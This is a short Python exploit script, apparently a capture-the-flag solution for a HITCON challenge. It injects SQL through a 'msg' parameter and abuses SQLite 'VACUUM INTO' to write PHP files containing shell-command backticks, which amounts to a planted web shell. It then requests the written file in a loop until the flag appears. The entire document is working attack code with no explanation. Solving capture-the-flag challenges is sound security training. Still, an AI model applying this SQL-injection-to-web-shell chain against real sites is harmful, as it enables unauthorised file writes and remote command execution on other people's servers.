import hashlib
import time
import requests

host = "http://localhost:8080"
host = "http://orange.chal.hitconctf.com"

ip = requests.get("http://ifconfig.me/ip").text.strip()
sandbox = hashlib.md5(f"orange{ip}".encode()).hexdigest()
# sandbox = "a7037d2920d70a447f0d2abc15d58cc1"
print(sandbox)

requests.get(f"{host}", params={"reset": 1}).text

payload = """<?=`*`;');VACUUM INTO('u.php"""
requests.get(f"{host}", params={"msg": payload}).text

payload = """<?=`wc .>z`;');VACUUM INTO('t"""
requests.get(f"{host}", params={"msg": payload}).text

payload = """');VACUUM INTO('php"""
requests.get(f"{host}", params={"msg": payload}).text

requests.get(f"{host}/sandbox/{sandbox}/u.php").text

payload = """<?=`/r*<z`;');VACUUM INTO('s"""
requests.get(f"{host}", params={"msg": payload}).text

while True:
    time.sleep(1)
    r = requests.get(f"{host}/sandbox/{sandbox}/u.php").text
    print(r)
    if "hitcon" in r: break
